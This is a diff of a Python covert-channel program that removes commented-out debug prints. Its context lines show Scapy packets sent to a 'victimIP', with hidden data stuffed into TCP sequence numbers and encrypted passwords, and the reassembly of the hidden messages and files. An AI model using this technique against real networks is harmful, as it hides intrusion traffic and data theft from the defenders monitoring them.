@@ -219,12 +219,10 @@ def chunkMessage(message,protocol):
             end = (i*length)+(length - 1) #31
             output.append(message[start:end+1])
             i = i + 1
-            # print "END OF ROUND " + str(output)
         #All the full packets have been created. Now to deal with the excess
         if(excess > 0):
             #Add the excess to the output array.
             output.append(message[(end+1):(end+1+excess)])
-        # print output
         return output
 
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
@@ -288,7 +286,6 @@ def craftPacket(data,protocol,position,total,UID):
     #If protocol is TCP, we stuff data inside the sequence number.
     #The payload contains the unique password, UID, position number and total.
     if(protocol == "TCP"):
-        # print "Put Data " + str(int(data,2)) + "into Seq Number"
         packet = IP(dst=victimIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
         seq=int(str(data),2))/Raw(load=encrypt(password+"\n"+UID+"\n"+str(position)+":" \
         + str(total)))
@@ -313,7 +310,6 @@ def craftPacket(data,protocol,position,total,UID):
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def generateUID():
     uid = uuid.uuid1()
-    # print 'Made a UID ' + str(uid)
     return str(uid)
 
 
@@ -445,11 +441,10 @@ def addToMessages(messages, UID, total, covertContent):
                 #"There is an existing element with same UID"
                 messages[x][2].append(covertContent)
                 return;
-                # print messages
             pass
         # If NONE of the elements have the same UID, create a
         # new entry
-        # print "There are no elements with the same UID"
+        # "There are no elements with the same UID"
         element = [UID, [int(total)], [covertContent]]
         messages.append(element)
 
@@ -467,17 +462,12 @@ def addToMessages(messages, UID, total, covertContent):
 --      the total, then all messagse have arrived.
 '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def checkMessages(UID):
-    #print "--Checking Commands--"
-    #print(messages)
     for x in range(len(messages)):
         element = messages[x]
         #print element[0]
         if(element[0] == UID):
-            #print "ELEMENT = UID"
             total = element[1][0]
-            #print "The total amount of messages is " + str(total)
             numMessages = len(element[2])
-            #print "The number of messages is " + str(numMessages)
             if(numMessages == total):
                 return True
     pass
@@ -516,7 +506,6 @@ def reconstructMessage(UID):
             for x in range(0, len(chunks)):
                  chunks[x] = int(chunks[x], 2)
                  chunks[x] = chr(chunks[x])
-            # print chunks
             return ''.join(chunks)
         pass
 
@@ -537,7 +526,6 @@ def deleteMessages(UID):
     #For all messages in memory, check for the element matching UID
     for x in range(len(messages)):
         element = messages[x]
-        #print element[0]
         if(element[0] == UID):
             del messages[x]
     pass
@@ -647,7 +635,6 @@ def writeFile(UID):
             line = text
             n = 8
             chunks = [line[i:i+n] for i in range(0, len(line), n)]
-            # print chunks
             #Convert each element in array to integer & letter.
             for x in range(0, len(chunks)):
                 chunks[x] = int(chunks[x], 2)
